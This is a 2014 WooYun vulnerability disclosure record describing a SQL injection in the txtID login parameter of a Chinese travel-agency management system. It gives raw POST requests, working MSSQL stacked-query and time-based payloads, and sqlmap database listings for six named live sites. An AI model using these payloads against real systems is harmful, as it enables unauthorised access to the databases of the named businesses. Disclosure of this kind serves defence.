{"id": 50629, "wybug_id": "wooyun-2014-077311", "wybug_title": "某业务管理系统存在通用型SQL注入漏洞", "wybug_corp": "苏州赛思科技有限公司", "wybug_author": "Mr.leo", "wybug_date": "2014-09-25 17:57", "wybug_open_date": "2014-12-24 17:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-24：\t细节向公众公开  简要描述： BOOM！！！ 详细说明：  苏州赛思科技有限公司 开发的星联盟综合业务管理系统公司案例http://www.sz-ss.net/Advantage/anlizhanshi/百度搜索关键字：星联盟综合业务管理系统用户登录http://www.999star.com/ 星联盟综合业务管理系统共开设10套子系统 A安徽事达航空国际旅行社有限公司(hf.999star.com)C长沙事达国际旅行社有限公司(cs.999star.com)G供应商订单签收系统(gys.999star.com)H海南万悦旅行社有限公司南京分公司(nj.999star.com)H海南事达国际旅行社有限公司上海分公司(sh.999star.com)H海南凤凰假期（西安）(xa.999star.com)J江西牵手旅行社有限公司(jx.999star.com)T太原海新之旅旅行社有限公司(ty.999star.com)W武汉新华国际旅行社有限公司(wh.999star.com)X徐州吉祥国际旅行社有限公司(xz.999star.com)系统txtID参数存在注入6个案例证明：1、http://www.sciencesoft.com.cn/Login.aspxPOST /Login.aspx?ReturnUrl=/UI HTTP/1.1Pragma: no-cacheCache-Control: no-cacheReferer: http://www.sciencesoft.com.cn/Login.aspxContent-Length: 119Content-Type: application/x-www-form-urlencodedAcunetix-Aspect: enabledAcunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66cAcunetix-Aspect-Queries: filelist;aspectalertsHost: www.sciencesoft.com.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*btnLogin=edqbdbmr&txtID=1&txtPwd=1&__VIEWSTATE=/wEPDwUKMjAwOTY4Mjc0OWRkwR2ccAPcAKsE%2bLjfk0vNHuZ9o6/u4G05gw0yP0aHBg0%3dsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: txtID    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: btnLogin=edqbdbmr&txtID=1'; WAITFOR DELAY '0:0:5';--&txtPwd=1&__VIEWSTATE=/wEPDwUKMjAwOTY4Mjc0OWRkwR2ccAPcAKsE+Ljfk0vNHuZ9o6/u4G05gw0yP0aHBg0=    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: btnLogin=edqbdbmr&txtID=1' WAITFOR DELAY '0:0:5'--&txtPwd=1&__VIEWSTATE=/wEPDwUKMjAwOTY4Mjc0OWRkwR2ccAPcAKsE+Ljfk0vNHuZ9o6/u4G05gw0yP0aHBg0=---[14:42:46] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008available databases [16]:[*] 33LY_DEMOA[*] 5HouyeDB[*] [model!][*] [PLAS\\x03][*] [SDLY\\x02][*] [Tourism\\x05][*] [WJDC\\x05][*] CsLand[*] mastqr[*] msdb[*] QYTX[*] SNDHRaA[*] SZDD[*] tempdq[*] testbase[*] TZJKOAA2、http://999star.com/Login.aspxPOST /Login.aspx HTTP/1.1Pragma: no-cacheCache-Control: no-cacheReferer: http://999star.com/Login.aspxContent-Length: 119Content-Type: application/x-www-form-urlencodedAcunetix-Aspect: enabledAcunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66cAcunetix-Aspect-Queries: filelist;aspectalertsHost: 999star.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*btnLogin=wgddapbf&txtID=1&txtPwd=1&__VIEWSTATE=/wEPDwUKMjAwOTY4Mjc0OWRkwR2ccAPcAKsE%2bLjfk0vNHuZ9o6/u4G05gw0yP0aHBg0%3dsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: txtID    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: btnLogin=wgddapbf&txtID=1'; WAITFOR DELAY '0:0:5';--&txtPwd=1&__VIEWSTATE=/wEPDwUKMjAwOTY4Mjc0OWRkwR2ccAPcAKsE+Ljfk0vNHuZ9o6/u4G05gw0yP0aHBg0=    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: btnLogin=wgddapbf&txtID=1' WAITFOR DELAY '0:0:5'--&txtPwd=1&__VIEWSTATE=/wEPDwUKMjAwOTY4Mjc0OWRkwR2ccAPcAKsE+Ljfk0vNHuZ9o6/u4G05gw0yP0aHBg0=---[14:59:30] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008[14:59:30] [INFO] fetching database names[14:59:30] [INFO] fetching number of databases[14:59:30] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..[15:00:20] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based queries1[15:01:03] [INFO] adjusting time delay to 3 seconds due to good response times6[15:01:29] [INFO] retrieved: 33LY_DEMO[15:09:06] [INFO] retrieved:[16:43:00] [INFO] retrieved: WJDCavailable databases [16]:[*] 33LY_DEMO[*] [5HouseDB\\x11][*] [QYTX!][*] CsLand[*] master[*] modgl[*] msdb[*] PLAS[*] SDLY[*] SNDHROA[*] SZDD[*] testbase[*] tgmpdb[*] Tourism[*] TZJKOA[*] WJDC3、http://www.360ly.com/Login.aspx?ReturnUrl=%2fPOST http://www.360ly.com/Login.aspx?ReturnUrl=%2f HTTP/1.1Host: www.360ly.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://www.360ly.com/Login.aspx?ReturnUrl=%2fConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 115__VIEWSTATE=%2FwEPDwUKMjAwOTY4Mjc0OWRkwR2ccAPcAKsE%2BLjfk0vNHuZ9o6%2Fu4G05gw0yP0aHBg0%3D&txtID=1&txtPwd=2&btnLogin=sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: txtID    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=/wEPDwUKMjAwOTY4Mjc0OWRkwR2ccAPcAKsE+Ljfk0vNHuZ9o6/u4G05gw0yP0aHBg0=&txtID=1'; WAITFOR DELAY '0:0:5';--&txtPwd=2&btnLogin=    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=/wEPDwUKMjAwOTY4Mjc0OWRkwR2ccAPcAKsE+Ljfk0vNHuZ9o6/u4G05gw0yP0aHBg0=&txtID=1' WAITFOR DELAY '0:0:5'--&txtPwd=2&btnLogin=---[14:59:36] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008[14:59:36] [INFO] fetching database names[14:59:36] [INFO] fetching number of databases[14:59:36] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..[15:00:26] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based queries[16:31:28] [INFO] retrieved: TZJKOA[16:37:57] [INFO] retrieved: WJDCavailable databases [16]:[*] 33LY_DEMO[*] 5HouseDB[*] [msdb\\x0b][*] [PLAS\\x05][*] CsLand[*] master[*] model[*] QYTX[*] SDLY[*] SNDHROA[*] SZDD[*] tempdb[*] testbase[*] Tourism[*] TZJKOA[*] WJDC4、http://xa.999star.com/Login.aspx?ReturnUrl=%2fPOST http://xa.999star.com/Login.aspx?ReturnUrl=%2f HTTP/1.1Host: xa.999star.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://xa.999star.com/Login.aspx?ReturnUrl=%2fConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 115__VIEWSTATE=%2FwEPDwUKMjAwOTY4Mjc0OWRkwR2ccAPcAKsE%2BLjfk0vNHuZ9o6%2Fu4G05gw0yP0aHBg0%3D&txtID=1&txtPwd=2&btnLogin=sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: txtID    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=/wEPDwUKMjAwOTY4Mjc0OWRkwR2ccAPcAKsE+Ljfk0vNHuZ9o6/u4G05gw0yP0aHBg0=&txtID=1'; WAITFOR DELAY '0:0:5';--&txtPwd=2&btnLogin=    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=/wEPDwUKMjAwOTY4Mjc0OWRkwR2ccAPcAKsE+Ljfk0vNHuZ9o6/u4G05gw0yP0aHBg0=&txtID=1' WAITFOR DELAY '0:0:5'--&txtPwd=2&btnLogin=---[14:59:43] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008[14:59:43] [INFO] fetching database names[14:59:43] [INFO] fetching number of databases[14:59:43] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..[15:00:33] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based queries1TZJKOA[16:48:49] [INFO] retrieved: WJDC!available databases [16]:[*] 33LY_DEMO[*] 5HouseDB[*] [tempdb!\\tC][*] [WJDC!][*] CsLand[*] master[*] model[*] msdb[*] PLAS[*] QYTX[*] SDLY[*] SNDHROA[*] SZDD[*] testbase[*] Tourism[*] TZJKOA5、http://jianyin.5house.net/Login.aspx?ReturnUrl=%2fPOST http://jianyin.5house.net/Login.aspx?ReturnUrl=%2f HTTP/1.1Host: jianyin.5house.netUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://jianyin.5house.net/Login.aspx?ReturnUrl=%2fConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 115__VIEWSTATE=%2FwEPDwUKMjAwOTY4Mjc0OWRkwR2ccAPcAKsE%2BLjfk0vNHuZ9o6%2Fu4G05gw0yP0aHBg0%3D&txtID=1&txtPwd=2&btnLogin=sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: txtID    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=/wEPDwUKMjAwOTY4Mjc0OWRkwR2ccAPcAKsE+Ljfk0vNHuZ9o6/u4G05gw0yP0aHBg0=&txtID=1'; WAITFOR DELAY '0:0:5';--&txtPwd=2&btnLogin=    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=/wEPDwUKMjAwOTY4Mjc0OWRkwR2ccAPcAKsE+Ljfk0vNHuZ9o6/u4G05gw0yP0aHBg0=&txtID=1' WAITFOR DELAY '0:0:5'--&txtPwd=2&btnLogin=---[15:02:31] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008[15:02:31] [INFO] fetching database names[15:02:31] [INFO] fetching number of databases[15:02:31] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..[15:03:21] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based queries1[15:04:04] [INFO] adjusting time delay to 3 seconds due to good response times6[15:04:30] [INFO] retrieved: 33LY_DEMO[15:12:09] [INFO] retrieved: 5Hoavailable databases [16]:[*] 33LY_DEMO[*] 5HouseDB[*] [SDLY\\x02\\x02!][*] [tempdb\\t][*] [testkase\\t][*] CsLand[*] master[*] model[*] msdb[*] PLAS[*] QYTX[*] SNDIROA[*] SZDD[*] Tourism[*] TZJKOA[*] WJDC6、http://hf.999star.com/Login.aspx?ReturnUrl=%2fPOST http://hf.999star.com/Login.aspx?ReturnUrl=%2f HTTP/1.1Host: hf.999star.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://hf.999star.com/Login.aspx?ReturnUrl=%2fConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 115__VIEWSTATE=%2FwEPDwUKMjAwOTY4Mjc0OWRkwR2ccAPcAKsE%2BLjfk0vNHuZ9o6%2Fu4G05gw0yP0aHBg0%3D&txtID=1&txtPwd=2&btnLogin=sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: txtID    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=/wEPDwUKMjAwOTY4Mjc0OWRkwR2ccAPcAKsE+Ljfk0vNHuZ9o6/u4G05gw0yP0aHBg0=&txtID=1'; WAITFOR DELAY '0:0:5';--&txtPwd=2&btnLogin=    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=/wEPDwUKMjAwOTY4Mjc0OWRkwR2ccAPcAKsE+Ljfk0vNHuZ9o6/u4G05gw0yP0aHBg0=&txtID=1' WAITFOR DELAY '0:0:5'--&txtPwd=2&btnLogin=---[15:12:46] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008[15:12:46] [INFO] fetching database names[15:12:46] [INFO] fetching number of databases[15:12:46] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..[15:13:36] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based queries1[15:14:19] [INFO] adjusting time delay to 3 seconds due to good response times6[15:14:45] [INFO] retrieved:[16:44:39] [INFO] retrieved: Tourism[16:51:53] [INFO] retrieved: TZJKOA[16:57:43] [INFO] retrieved: WJDCavailable databases [16]:[*] 33LY_DEMO[*] 5HouseDB[*] CsLandA[*] master[*] modem[*] msdb[*] PLAS[*] QYTX[*] SDLY[*] SNDHROA[*] SZDD[*] testbase[*] tgmpdb[*] Tourism[*] TZJKOA[*] WJDC   漏洞证明：  已经证明   修复方案：  过滤参数   版权声明：转载请注明来源 Mr.leo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2014-09-29 09:59 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}